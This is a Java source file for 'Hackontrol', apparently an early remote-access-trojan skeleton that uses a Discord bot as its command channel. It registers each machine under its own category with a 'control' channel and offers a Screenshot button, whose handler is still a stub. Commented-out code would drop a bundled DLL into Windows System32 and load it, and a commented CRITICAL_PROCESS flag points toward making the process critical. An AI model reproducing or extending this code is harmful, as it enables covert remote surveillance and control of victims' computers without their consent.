package com.khopan.hackontrol;

import java.util.List;

import net.dv8tion.jda.api.JDA;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageHistory;
import net.dv8tion.jda.api.entities.channel.concrete.Category;
import net.dv8tion.jda.api.entities.channel.concrete.TextChannel;
import net.dv8tion.jda.api.events.interaction.component.ButtonInteractionEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.requests.GatewayIntent;

public class Hackontrol {
	private static Hackontrol INSTANCE;

	/*@Native Useful for later
	private static final boolean CRITICAL_PROCESS = false;*/

	private final JDA bot;
	private final Guild guild;
	//private final Map<Command, com.khopan.hackontrol.command.Command> map;

	private Hackontrol() {
		Hackontrol.INSTANCE = this;
		//this.map = new LinkedHashMap<>();
		this.bot = JDABuilder.createDefault(Token.BOT_TOKEN)
				.enableIntents(GatewayIntent.MESSAGE_CONTENT)
				.addEventListeners(new Listener())
				.build();

		try {
			this.bot.awaitReady();
		} catch(Throwable Errors) {
			System.exit(0);
			this.guild = null;
			return;
		}

		this.guild = this.bot.getGuildById(1173967259304198154L);
		/*List<RichCustomEmoji> list = this.guild.getEmojis();
		//CommandManager.register(this :: register);

		for(int i = 0; i < list.size(); i++) {
			RichCustomEmoji emoji = list.get(i);
			System.out.println(emoji.getName());
		}*/

		String identifier = Machine.getIdentifier();
		Category category = DiscordUtils.getOrCreateCategory(this.guild, identifier);
		TextChannel controlChannel = DiscordUtils.getOrCreateTextChannelInCategory(category, "control");
		MessageHistory history = MessageHistory.getHistoryFromBeginning(controlChannel).complete();
		List<Message> messageList = history.getRetrievedHistory();

		if(messageList.isEmpty()) {
			controlChannel.sendMessage("**Screen Control**").addActionRow(Button.success("screenshot", "Screenshot")).complete();
		}

		/*Category category = this.guild.createCategory(identifier).complete();
		TextChannel channel = this.guild.createTextChannel("main", category).complete();
		channel.sendMessage("Hello, world!").complete();*/
	}

	/*private void register(Class<? extends com.khopan.hackontrol.command.Command> commandClass) {
		if(commandClass == null) {
			return;
		}

		com.khopan.hackontrol.command.Command command;

		try {
			command = commandClass.getConstructor().newInstance();
		} catch(Throwable Errors) {
			return;
		}

		SlashCommandData data = command.getCommand();
		Command botCommand;

		try {
			botCommand = this.bot.upsertCommand(data).complete();
		} catch(Throwable Errors) {
			return;
		}

		this.map.put(botCommand, command);
	}

	private void onSlashCommand(SlashCommandInteractionEvent Event) {
		long identifier = Event.getCommandIdLong();
		Iterator<Entry<Command, com.khopan.hackontrol.command.Command>> iterator = this.map.entrySet().iterator();

		while(iterator.hasNext()) {
			Entry<Command, com.khopan.hackontrol.command.Command> entry = iterator.next();
			Command key = entry.getKey();
			com.khopan.hackontrol.command.Command value = entry.getValue();

			if(key.getIdLong() != identifier) {
				continue;
			}

			Permission permission = value.getPermissionLevel();
			User user = Event.getUser();

			if(PermissionManager.checkPermission(user, permission)) {
				new Thread(() -> value.handleCommand(Event)).start();
				return;
			}

			Event.reply("`You don't have permission to use this command\nThis command required at least " + permission.getName() + "`")
			.queue();
			return;
		}
	}*/

	public JDA getBot() {
		return this.bot;
	}

	public Guild getGuild() {
		return this.guild;
	}

	public static void main(String[] args) throws Throwable {
		/*String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File win32Library = new File(system32Directory, "win32c.dll");
		Win32Library.setCopyLibraryPath(win32Library.getAbsolutePath());
		File libraryFile = new File(system32Directory, Hackontrol.LIBRARY_NAME);
		InputStream stream = Hackontrol.class.getResourceAsStream("Hackontrol.dll");
		byte[] data = stream.readAllBytes();
		stream.close();

		try {
			FileOutputStream output = new FileOutputStream(libraryFile);
			output.write(data);
			output.close();
		} catch(Throwable Errors) {

		}

		System.load(libraryFile.getAbsolutePath());*/
		//System.load("D:\\GitHub Repository\\Hackontrol\\Native Library\\x64\\Release\\Native Library.dll");
		Hackontrol.getInstance();
	}

	public static Hackontrol getInstance() {
		if(Hackontrol.INSTANCE == null) {
			Hackontrol.INSTANCE = new Hackontrol();
		}

		return Hackontrol.INSTANCE;
	}

	private class Listener extends ListenerAdapter {
		@Override
		public void onButtonInteraction(ButtonInteractionEvent Event) {
			Event.deferReply().queue(hook -> hook.deleteOriginal().queue());
		}
	}
}
